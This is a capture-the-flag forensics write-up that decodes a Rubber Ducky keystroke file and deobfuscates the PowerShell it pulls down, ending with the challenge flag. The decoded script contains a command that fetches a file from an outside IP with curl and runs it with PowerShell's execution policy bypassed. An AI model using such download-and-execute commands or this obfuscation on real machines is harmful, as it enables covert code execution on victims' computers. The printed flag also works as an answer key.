## Duck hunt (Forensics)

### [~$ cd ..](../)

We are given a [strange file](unkown.bin), not recognized by the `strings` command. The title of the challenge was quite helpful, and I guessed that it was
probably about Rubber Ducky. I then uploaded the file on https://ducktoolkit.com/decoder, and downloaded the [answer](duck_text.txt):

> ```
>DELAY
>ADELAY
>DELAY
>DELAY
>cd / & mkdir .haxor & cd .haxor & echo (curl -X GET  http://34.240.44.38/payload.txt) > file.PS1 & powershell -ExecutionPolicy ByPass -File file.ps1DELAY
> ```

I then downloaded the file payload.txt, and found an obfuscated powershell [code](payload.ps1).

> ```powershell
> ${;}=+$();
>${=}=${;};
>${+}=++${;};
>${@}=++${;};
>${.}=++${;};
>${[}=++${;};
>\n${]}=++${;};
>${(}=++${;};
>${)}=++${;};
>${&}=++${;};
>${|}=++${;};
>${"}="["+"$(@{})"[${)}]+"$(@{})"["${+}${|}"]+"$(@{})"["${@}${=}"]+"$?"[${+}]+"]";
>${;}="".("$(@{})"["${+}${[}"]+"$(@{})"["${+}${(}"]+"$(@{})"[${=}]+"$(@{})"[${[}]+"$?"[${+}]+"$(@{})"[${.}]);
>${;}="$(@{})"["${+}${[}"]+"$(@{})"[${[}]
>"${"}${.}${(}+${"}${+}${=}${@}+${"}${+}${=}${&}+${"}${|}${)}+${"}${+}${=}${.}+${"}${(}${+}+${"}${&}${@}+${"}${+}${=}${+}+${"}${|}${)}+${"}${+}${=}${=}+${"}${[}${]}+${"}${)}${@}+${"}${+}${+}${+}+${"}${+}${+}${]}+${"}${+}${+}${(}+${"}${.}${@}+${"}${[}${]}+${"}${&}${=}+${"}${+}${+}${[}+${"}${+}${+}${+}+${"}${+}${=}${|}+${"}${+}${+}${@}+${"}${+}${+}${(}+${"}${.}${@}+${"}${.}${|}+${"}${(}${|}+${"}${+}${+}${=}+${"}${+}${+}${(}+${"}${+}${=}${+}+${"}${+}${+}${[}+${"}${.}${@}+${"}${+}${+}${(}+${"}${+}${=}${[}+${"}${+}${=}${+}+${"}${.}${@}+${"}${+}${+}${@}+${"}${|}${)}+${"}${+}${+}${]}+${"}${+}${+}${]}+${"}${+}${+}${|}+${"}${+}${+}${+}+${"}${+}${+}${[}+${"}${+}${=}${=}+${"}${.}${|}+${"}${+}${.}+${"}${+}${=}+${"}${)}${.}+${"}${+}${=}${@}+${"}${[}${=}+${"}${+}${=}${@}+${"}${+}${=}${&}+${"}${|}${)}+${"}${+}${=}${.}+${"}${.}${@}+${"}${[}${]}+${"}${+}${=}${+}+${"}${+}${+}${.}+${"}${.}${@}+${"}${.}${|}+${"}${)}${=}+${"}${+}${=}${&}+${"}${|}${)}+${"}${+}${=}${.}+${"}${+}${@}${.}+${"}${+}${=}${]}+${"}${+}${+}${]}+${"}${|}${]}+${"}${|}${)}+${"}${|}${]}+${"}${+}${+}${[}+${"}${+}${+}${)}+${"}${|}${&}+${"}${|}${&}+${"}${+}${=}${+}+${"}${+}${+}${[}+${"}${|}${]}+${"}${+}${=}${=}+${"}${+}${+}${)}+${"}${|}${|}+${"}${+}${=}${)}+${"}${+}${@}${+}+${"}${|}${]}+${"}${+}${+}${)}+${"}${+}${+}${]}+${"}${+}${=}${+}+${"}${+}${=}${=}+${"}${|}${]}+${"}${+}${+}${]}+${"}${+}${+}${+}+${"}${+}${=}${|}+${"}${+}${=}${+}+${"}${+}${+}${|}+${"}${+}${=}${[}+${"}${+}${=}${+}+${"}${+}${+}${[}+${"}${+}${=}${+}+${"}${.}${.}+${"}${+}${@}${]}+${"}${.}${|}+${"}${[}${+}+${"}${+}${@}${.}+${"}${+}${.}+${"}${+}${=}+${"}${|}+${"}${&}${)}+${"}${+}${+}${[}+${"}${+}${=}${]}+${"}${+}${+}${(}+${"}${+}${=}${+}+${"}${[}${]}+${"}${)}${@}+${"}${+}${+}${+}+${"}${+}${+}${]}+${"}${+}${+}${(}+${"}${.}${@}+${"}${.}${|}+${"}${)}${+}+${"}${+}${+}${+}+${"}${+}${+}${+}+${"}${+}${=}${=}+${"}${.}${@}+${"}${)}${[}+${"}${+}${+}${+}+${"}${|}${&}+${"}${.}${.}+${"}${.}${|}+${"}${]}${|}+${"}${+}${.}+${"}${+}${=}+${"}${|}+${"}${&}${)}+${"}${+}${+}${[}+${"}${+}${=}${]}+${"}${+}${+}${(}+${"}${+}${=}${+}+${"}${[}${]}+${"}${)}${@}+${"}${+}${+}${+}+${"}${+}${+}${]}+${"}${+}${+}${(}+${"}${.}${@}+${"}${.}${[}+${"}${.}${(}+${"}${+}${=}${@}+${"}${+}${=}${&}+${"}${|}${)}+${"}${+}${=}${.}+${"}${.}${[}+${"}${+}${.}+${"}${+}${=}+${"}${+}${@}${]}"
> ```

I guessed that it was a big concatenation building the flag. It gave me:

![powershell](powershell.png)

or, in Python:

> ```python
>chr(36)+chr(102)+chr(108)+chr(97)+chr(103)+chr(61)+chr(82)+chr(101)+chr(97)+chr(100)+chr(45)+chr(72)+chr(111)+chr(115)+chr(116)+chr(32)+chr(45)+chr(80)+chr(114)+chr(111)+chr(109)+chr(112)+chr(116)+chr(32)+chr(39)+chr(69)+chr(110)+chr(116)+chr(101)+chr(114)+chr(32)+chr(116)+chr(104)+chr(101)+chr(32)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(111)+chr(114)+chr(100)+chr(39)+chr(13)+chr(10)+chr(73)+chr(102)+chr(40)+chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(45)+chr(101)+chr(113)+chr(32)+chr(39)+chr(70)+chr(108)+chr(97)+chr(103)+chr(123)+chr(105)+chr(115)+chr(95)+chr(97)+chr(95)+chr(114)+chr(117)+chr(98)+chr(98)+chr(101)+chr(114)+chr(95)+chr(100)+chr(117)+chr(99)+chr(107)+chr(121)+chr(95)+chr(117)+chr(115)+chr(101)+chr(100)+chr(95)+chr(115)+chr(111)+chr(109)+chr(101)+chr(119)+chr(104)+chr(101)+chr(114)+chr(101)+chr(33)+chr(125)+chr(39)+chr(41)+chr(123)+chr(13)+chr(10)+chr(9)+chr(87)+chr(114)+chr(105)+chr(116)+chr(101)+chr(45)+chr(72)+chr(111)+chr(115)+chr(116)+chr(32)+chr(39)+chr(71)+chr(111)+chr(111)+chr(100)+chr(32)+chr(74)+chr(111)+chr(98)+chr(33)+chr(39)+chr(59)+chr(13)+chr(10)+chr(9)+chr(87)+chr(114)+chr(105)+chr(116)+chr(101)+chr(45)+chr(72)+chr(111)+chr(115)+chr(116)+chr(32)+chr(34)+chr(36)+chr(102)+chr(108)+chr(97)+chr(103)+chr(34)+chr(13)+chr(10)+chr(125)
> ```

And finally, by rebuilding the string:

> ```powershell
>$flag=Read-Host -Prompt 'Enter the password'
>If(flag -eq 'Flag{is_a_rubber_ducky_used_somewhere!}'){
>	Write-Host 'Good Job!';
>	Write-Host "$flag"
>}
> ```


